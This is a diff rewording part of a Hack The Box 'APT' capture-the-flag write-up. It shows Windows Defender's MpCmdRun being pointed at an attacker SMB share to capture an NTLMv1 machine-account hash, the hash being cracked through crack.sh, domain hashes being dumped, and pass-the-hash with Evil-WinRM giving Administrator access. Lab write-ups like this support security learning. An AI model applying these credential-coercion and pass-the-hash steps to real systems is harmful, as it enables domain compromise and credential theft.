 MpCmdRun: Command Line: "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe" -Scan -ScanType 3 -File \\10.10.14.187:8081\file.txt
@@ -1191,7 +1191,7 @@ MpCmdRun: End Time:  Thu  Apr  01  2021 22:29:11
 -------------------------------------------------------------------------------------
 ```
 
-The scan failed
+The scan errored out
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -1226,17 +1226,17 @@ The scan failed
 [*] Skipping previously captured hash for HTB\APT$
 ```
 
-However, I got a hit back on my listener! I had the NTLMv1 hash of the user APT$
+Even so, my listener caught something! I now had the NTLMv1 hash for the APT$ account
 
 > Remember that the printer will use the computer account during the authentication, and computer accounts use long and random passwords that you probably won't be able to crack using common dictionaries. But the NTLMv1 authentication uses DES \(more info here\), so using some services specially dedicated to cracking DES you will be able to crack it \(you could use [https://crack.sh/](https://crack.sh/) for example\).
 
-So this was the computer hash...I seem to remember reading this wasnt useful, but I tried to crack it anyway.
+So this was the machine account hash...I vaguely recalled reading it wasn't useful, but I went ahead and tried cracking it anyway.
 
 * [https://crack.sh/netntlm/](https://crack.sh/netntlm/)
 
 > There’s a number of articles on the LmCompatibilityLevel setting in Windows, but this will only work if a client has this setting at 2 or lower.
 
-Looking good so far
+So far so good
 
 * [https://crack.sh/get-cracking/](https://crack.sh/get-cracking/)
 
@@ -1244,9 +1244,9 @@ Looking good so far
 NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
 ```
 
-This is the format they wanted the hash submitted in.
+That's the format crack.sh expects for submission.
 
-I entered a throwaway email address, and submitted the hash. NTLMv1 hashes in the correct format are free.
+I plugged in a disposable email and submitted the hash. Correctly formatted NTLMv1 hashes are cracked for free.
 
 ```text
 Crack.sh has successfully completed its attack against your NETNTLM handshake. The NT hash for the handshake is included below, and can be plugged back into the 'chapcrack' tool to decrypt a packet capture, or to authenticate to the server:
@@ -1257,7 +1257,7 @@ Key: d167c3238864b12f5f82feae86a7f798
 This run took 32 seconds. Thank you for using crack.sh, this concludes your job.
 ```
 
-I received an email very quickly from their server. It only took 32 seconds to find the hash in the rainbow table. Now I just needed to figure out how to use the machine account hash...
+Their server emailed me back almost immediately. It only took 32 seconds to look the hash up in the rainbow table. Now I just had to work out how to leverage the machine account hash...
 
 * [http://blog.carnal0wnage.com/2015/09/domain-controller-machine-account-to.html](http://blog.carnal0wnage.com/2015/09/domain-controller-machine-account-to.html)
 * [https://winaero.com/beware-microsoft-defender-mpcmdrun-exe-tool-can-be-used-to-download-files/](https://winaero.com/beware-microsoft-defender-mpcmdrun-exe-tool-can-be-used-to-download-files/)
@@ -1297,9 +1297,9 @@ APT$:des-cbc-md5:76c45245f104a4bf
 [*] Cleaning up...
 ```
 
-Using the template from the blog I was able to dump the hashes from the machine. There were not nearly as many accounts as in the backup! :\)
+Following the blog's template, I dumped the hashes straight off the machine. Far fewer accounts than the backup had! :\)
 
-Now that I had the Administrator hash, it was time to crack it!
+With the Administrator hash in hand, it was time to crack it!
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -1328,7 +1328,7 @@ Started: Thu Apr  1 18:11:51 2021
 Stopped: Thu Apr  1 18:11:59 2021
 ```
 
-I was able to go through all of rockyou.txt in less than 10 seconds, but the password was not in it. I decided to just try to use the hash to log in instead
+rockyou.txt blew through in under 10 seconds, but the password wasn't in it. So I just went with pass-the-hash instead
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -1338,7 +1338,7 @@ Evil-WinRM shell v2.3
 
 Info: Establishing connection to remote endpoint
 
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> whoami /all
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /all
 
 USER INFORMATION
 ----------------
@@ -1406,18 +1406,18 @@ User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled.
 
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> $env:username;$env:computername
+*Evil-WinRM* PS C:\Users\Administrator\Documents> $env:username;$env:computername
 Administrator
 APT
 ```
 
-Make sure to use `-H` for hash, and not `-p` for password!
+Remember to pass `-H` for the hash rather than `-p` for a password!
 
 ### Root.txt
 
 ```text
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> cd ../Desktop
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> ls
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
 
     Directory: C:\Users\Administrator\Desktop
 
@@ -1425,6 +1425,6 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -ar---         4/1/2021   9:35 AM             34 root.txt
 
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> cat root.txt
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
 366c************************bd15
 ```
